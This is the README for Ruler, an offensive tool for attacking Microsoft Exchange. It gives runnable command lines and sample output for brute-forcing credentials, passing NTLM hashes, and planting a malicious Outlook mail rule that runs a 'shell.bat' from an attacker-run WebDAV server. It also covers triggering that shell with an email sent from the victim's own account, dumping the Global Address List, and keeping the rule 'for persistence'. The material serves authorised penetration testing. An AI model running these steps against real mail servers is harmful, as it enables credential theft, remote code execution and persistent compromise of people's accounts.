# Introduction

Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook mail rules as described in: [Silentbreak blog]

Silentbreak did a great job with this attack and it has served us well. The only downside has been that it takes time to get setup. Cloning a mailbox into a new instance of Outlook can be time consuming. And then there is all the clicking it takes to get a mailrule created. Wouldn't the command line version of this attack be great? And that is how Ruler was born.

The full low-down on how Ruler was implemented and some background regarding MAPI can be found in our blog post: [SensePost blog]

For a demo of it in action: [Ruler on YouTube]

## What does it do?

Ruler has multiple functions and more are planned. These include

* Enumerate valid users
* View currently configured mail rules
* Create new malicious mail rules
* Delete mail rules
* Dump the Global Address List (GAL)

Ruler attempts to be semi-smart when it comes to interacting with Exchange and uses the Autodiscover service (just as your Outlook client would) to discover the relevant information.

# Pre-built Binaries

Compiled binaries for Linux, OSX and Windows are available. Find these in [Releases]


# Getting the Code

Ruler is written in Go so you'll need to have [Go setup](https://golang.org/doc/install) to run/build the project from source. The easiest way to get up and running from source is through ```go get```.

Get it through Go:
```
go get github.com/sensepost/ruler
```

You can now run the app through ```go run``` in the GOPATH/src/github.com/sensepost/ruler directory:
```
go run ruler.go -h
```

### Or build it:

When building you'll need to have your [GOPATH correctly configured](https://golang.org/doc/install).

The first step as always is to clone the repo. Here it is probably best to clone into ```$GOPATH/src/github.com/sensepost/ruler``` this saves you from having to change a whole bunch of paths. If you are cloning into a different directory, remember you'll need to change all references to ```github.com/sensepost/ruler``` in the imports.

```
git clone https://github.com/sensepost/ruler.git
```

Ensure you have the dependencies (go get is the easiest option, otherwise clone the repos into your GOPATH):
```
go get github.com/urfave/cli
go get github.com/howeyc/gopass
go get github.com/staaldraad/go-ntlm/ntlm
```
Then build it
```
go build
```


# Interacting with Exchange

Ruler works with both RPC/HTTP and MAPI/HTTP. Ruler favours MAPI/HTTP as this is the default in Exchange 2016 and Office365 deployments. If MAPI/HTTP fails, an attempt will be made to use RPC/HTTP. You can also force RPC/HTTP by supplying the ```--rpc``` flag.

As mentioned before there are multiple functions to Ruler. In most cases you'll want to first find a set of valid credentials. Do this however you wish, Phishing, Wifi+Mana or brute-force.

# Basic Usage

Ruler has 5 basic commands, these are:

* display -- list all the current rules
* add -- add a rule
* delete -- delete a rule
* brute -- brute force credentials
* send -- send an email to trigger the shell
* help -- show the help screen

There are a few global flags that should be used with most commands, while each command has sub-flags. For details on these, use the **help** command.

```
NAME:
   ruler - A tool to abuse Exchange Services

USAGE:
   ruler-linux64 [global options] command [command options] [arguments...]

VERSION:
   2.0.17

DESCRIPTION:
            _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @_staaldraad from @sensepost to abuse Exchange Services.

AUTHOR:
   Etienne Stalmans <etienne@sensepost.com>, @_staaldraad

COMMANDS:
     add, a       add a new rule
     delete, r    delete an existing rule
     display, d   display all existing rules
     check, c     Check if the credentials work and we can interact with the mailbox
     send, s      Send an email to trigger an existing rule. This uses the target user's own account.
     brute, b     Do a bruteforce attack against the autodiscover service to find valid username/passwords
     abk          Interact with the Global Address Book
     troopers, t  Troopers
     help, h      Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --domain value, -d value    A domain for the user (optional in most cases. Otherwise allows: domain\username)
   --o365                      We know the target is on Office365, so authenticate directly against that.
   --username value, -u value  A valid username
   --password value, -p value  A valid password
   --hash value                A NT hash for pass the hash
   --email value, -e value     The target's email address
   --cookie value              Any third party cookies such as SSO that are needed
   --url value                 If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml
   --insecure, -k              Ignore server SSL certificate errors
   --encrypt                   Use NTLM auth on the RPC level - some environments require this
   --basic, -b                 Force Basic authentication
   --admin                     Login as an admin
   --nocache                   Don't use the cached autodiscover record
   --rpc                       Force RPC/HTTP rather than MAPI/HTTP
   --verbose                   Be verbose and show some of thei inner workings
   --help, -h                  show help
   --version, -v               print the version
```

## Brute-force for credentials

If you go the brute-force route, Ruler is your friend. It has a built-in brute-forcer which does a semi-decent job of finding creds.

```
./ruler --domain targetdomain.com brute --users /path/to/user.txt --passwords /path/to/passwords.txt
```
You should see your brute-force in action:

```
./ruler --domain evilcorp.ninja --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose

[*] Starting bruteforce
[x] Failed: cindy.baker:P@ssw0rd
[x] Failed: henry.hammond:P@ssw0rd
[x] Failed: john.ford:P@ssw0rd
[x] Failed: cindy.baker:August2016
[x] Failed: henry.hammond:August2016
[+] Success: john.ford:August2016
[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
[x] Failed: cindy.baker:Evilcorp@2016
[x] Failed: henry.hammond:Evilcorp@2016
[x] Failed: cindy.baker:3V1lc0rp
[x] Failed: henry.hammond:3V1lc0rp
[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
[x] Failed: henry.hammond:Password1
[+] Success: cindy.baker:Password1
```

Alternatively, you can specify a userpass file with the ```--userpass``` option. The userpass file should be colon-delimited with one pair of credentials per line:

```
$ cat userpass.txt
john.ford:August2016
henry.hammond:Password!2016
cindy.baker:Password1

./ruler --domain evilcorp.ninja --insecure brute --userpass userpass.txt -v

[*] Starting bruteforce
[+] Success: john.ford:August2016
[x] Failed: henry.hammond:Password!2016
[+] Success: cindy.baker:Password1
```

There are a few other flags that work with ```brute```

These are:
* --stop _//stop on the first valid username:password combo_
* --delay _//how long to wait between multiple password guesses_
* --attempts _//how many attempts before we delay (attempts per user)_
* --insecure _//if the Exchange server has a bad SSL cerificate_
* --verbose      _//be verbose and show failed attempts_

## The autodiscover service
While Ruler makes a best effort to "autodiscover" the necessary settings, you may still run into instances of it failing. The common causes are:
* autodiscover deployed over http and not https (we default to https as this is more common)
* No autodiscover DNS record
* Authentication failing

If you encounter an Exchange server where the Autodiscover service is failing, you can manually specify the Autodiscover URL:

```
./ruler --url http://autodiscover.somedomain.com/autodiscover/autodiscover.xml
```

If you run into issues with Authentication (and you know the creds are correct), you can try and force the use of basic authentication with the global ```--basic```

The global ```--verbose``` flag will also give you some insight into the process being used by the autodiscover service.

### --domain is not needed

Another interesting thing to note, is that Ruler doesn't require the ```--domain``` for authentication or autodiscover in most cases. The autodiscover service works off the email addresses domain. If you find that authentication is failing, it might mean that you require the internal domain name as part of the authentication string. For this, you will need to add ```--domain DOMAIN``` to your requests. This will ensure that NTLM auth does ```DOMAIN\USERNAME``` in the authentication sequence, instead of ```.\USERNAME```.  

Basic rule, use ```--domain``` with bruteforce (it uses this to figure out the autodiscover URL), otherwise leave it off.

## PtH - Passing the hash

Ruler has support for PtH attacks, allowing you to reuse valid NTLM hashes (think responder, mimikatz, mana-eap) instead of a password. Simply provide the hash instead of a password and you are good to go. To provide the hash, use the global flag ```--hash```.

```
./ruler  --username validuser --hash 71bc15c57d836a663ed0b02631d300be --email user@domain.com display
```

## Display existing rules / verify account

Once you have a set of credentials you can target the user's mailbox. Here you'll need to know their email address (address book searching is in the planned extension).

```
./ruler  --email user@targetdomain.com --username username --password password display
```

Output:

```
./ruler  --username john.ford --password August2016 --email john.ford@evilcorp.ninja display
[*] Retrieving MAPI info
[*] Doing Autodiscover for domain
[+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
[+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
[*] Got Context, Doing ROPLogin
[*] And we are authenticated
[*] Openning the Inbox
[+] Retrieving Rules
[+] Found 0 rules
```

## Delete existing rules (clean up after  yourself)
To delete rules, use either the ruleId displayed next to the rule name (000000df1), or the rule name. You will be prompted to verify the rule being deleted if you supply only the name.

```
./ruler --email user@targetdomain.com --username username delete --id 000000df1
```

```
./ruler --email user@targetdomain.com --username username delete --name myrule
```


# Popping a shell

Now the fun part. Your initial setup is the same as outlined in the [Silentbreak blog], setup your webdav server to host your payload. A basic webdav server is included in this repostitory. This can be found [here](https://github.com/sensepost/ruler/blob/master/webdav/webdavserv.go). To use this,

```
go run webdavserv.go -d /path/to/directory/to/serve
```

## Create a Rule
To create the new rule user Ruler and:

```
./ruler --email user@targetdomain.com --username username add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
```

The various parts:
* `--location` _this is the location of your remote shell *note the double slashes* (or c:/Windows/system32/calc.exe)_
* `--trigger` _the string within the subject you want to trigger the rule_
* `--name` _a name for your rule_


Output:
```
[*] Retrieving MAPI info
[*] Doing Autodiscover for domain
[+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
[+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
[*] Got Context, Doing ROPLogin
[*] And we are authenticated
[*] Openning the Inbox
[*] Adding Rule
[*] Rule Added. Fetching list of rules...
[+] Found 1 rules
Rule: shell RuleID: 01000000127380b1
```

You should now be able to send an email to your target with the trigger string in the subject line. From testing the mailrule is synchronised across nearly instantaniously, so in most cases you should be able to get a shell almost immediatly, assuming outlook is open and connected.

# Semi-Autopwn

If you want to automate the triggering of the rule, Ruler is able to create a new message in the user's inbox, using their own email address. This means you no longer need to send an email to your target. Simply use the ```--send``` flag when creating your rule, and Ruler will wait 30seconds for your rules to synchronise (adjust this in the source if you think 30s is too long/short) and then send an email via MAPI.

To customise the email sent with the ```--send``` flag, you can use ```--subject``` to specify a custom subject (remember to include your trigger word in the subject). Customise the body with ```--body```

```
...
[*] Adding Rule
[*] Rule Added. Fetching list of rules...
[+] Found 1 rules
Rule: autopop RuleID: 010000000c4baa84
[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)
[*] Sending email
[*] Message sent, your shell should trigger shortly.
[*] And disconnecting from server
```

If you want to send the email manually, using the targets own email address, you can also call the ```send``` command directly.

```
./ruler --email user@targetdomain.com send --subject test --body "this is a test"
```

Enjoy your shell and don't forget to clean-up after yourself by deleting the rule (or leave it for persistence).

# Getting the GAL

The Global Address List contains a listing of all addresses stored in the organisational addressbook. If your target is accessible through MAPI/HTTP you can list or download the GAL.

To list:

```
./ruler --email user@targetdomain.com abk list"
```

This will display all entries on screen. Now there can be ALOT of entries, so it's probably more useful to dump this list to file for offline parsing. To do this use the ```dump``` command.

```
./ruler --email user@targetdomain.com abk dump --output /tmp/gal.txt
```

[Silentbreak blog]: <https://silentbreaksecurity.com/malicious-outlook-rules/>
[SensePost blog]: <https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/>
[Ruler on YouTube]:<https://youtu.be/C07GS4M8BZk>
[Releases]: <https://github.com/sensepost/ruler/releases>
